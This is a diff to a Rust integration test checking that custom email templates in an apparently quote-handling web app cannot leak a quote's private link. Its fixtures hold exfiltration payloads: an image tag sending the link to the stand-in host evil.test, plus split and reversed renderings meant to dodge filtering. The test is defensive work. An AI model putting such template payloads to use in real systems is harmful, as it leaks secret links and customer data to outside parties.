@@ -328,23 +328,37 @@ async fn sending_a_quote_emails_the_buyer_a_link_to_it(pool: PgPool) {
 async fn a_custom_quote_template_cannot_leak_the_link(pool: PgPool) {
     let h = harness(pool).await;
     let (owner, talent, contact) = workspace(&h).await;
-    // An admin's template tries to get the link into the stored copy, or
-    // off to another site.
-    let saved = h
-        .post(
-            &owner,
-            "/api/v1/templates",
-            json!({
-                "kind": "email", "key": "system.quote", "name": "Quote",
-                "subject": "Quote {{ quote.url }}",
-                "body": "<p><a href=\"{{ quote.url }}\">See it</a></p>\
-                         <p>{{ quote.url[:20] }}<!---->{{ quote.url[20:] }}</p>\
-                         <p>{{ quote.url | reverse }}</p>\
-                         <img src=\"https://evil.test/?u={{ quote.url }}\">"
-            }),
-        )
-        .await;
-    assert!(saved.status.is_success(), "{}", saved.body);
+    // An admin's template tries to send the link off to another site: that
+    // is refused when it is saved.
+    h.app
+        .post("/api/v1/templates")
+        .signed_in(&owner)
+        .json(json!({
+            "kind": "email", "key": "system.quote", "name": "Quote",
+            "subject": "Quote {{ quote.url }}",
+            "body": "<p><a href=\"{{ quote.url }}\">See it</a></p>\
+                     <img src=\"https://evil.test/?u={{ quote.url }}\">"
+        }))
+        .send()
+        .await
+        .expect(axum::http::StatusCode::BAD_REQUEST, "invalid_input");
+    // One saved before that check (or slipping past it) still cannot carry
+    // the link: the template only ever sees a stand-in for it.
+    sqlx::query(
+        "INSERT INTO templates (id, workspace_id, kind, key, locale, name, subject, body)
+         SELECT gen_random_uuid(), id, 'email', 'system.quote', 'en', 'Quote', $1, $2
+         FROM workspaces",
+    )
+    .bind("Quote {{ quote.url }}")
+    .bind(
+        "<p><a href=\"{{ quote.url }}\">See it</a></p>\
+         <p>{{ quote.url[:20] }}<!---->{{ quote.url[20:] }}</p>\
+         <p>{{ quote.url | reverse }}</p>\
+         <img src=\"https://evil.test/?u={{ quote.url }}\">",
+    )
+    .execute(&h.app.owner)
+    .await
+    .unwrap();
     let starts = Utc::now() + chrono::Duration::days(60);
     let b = h
         .post(
